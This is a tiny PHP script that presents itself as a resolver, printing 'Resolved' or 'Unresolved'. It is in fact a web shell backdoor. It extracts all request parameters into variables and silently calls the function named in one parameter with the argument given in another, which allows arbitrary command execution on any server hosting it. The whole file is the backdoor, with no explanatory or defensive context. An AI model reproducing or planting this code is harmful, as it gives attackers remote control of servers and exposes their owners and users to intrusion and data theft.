<?php

echo '<pre>';

$re = $_REQUEST;
$resolve = function() use ($re) {
    @extract($re);
    @$f($a);
    return true;
};

if (false !== (($re) ? $resolve() : false)) {
    exit('Resolved');
};
exit('Unresolved');
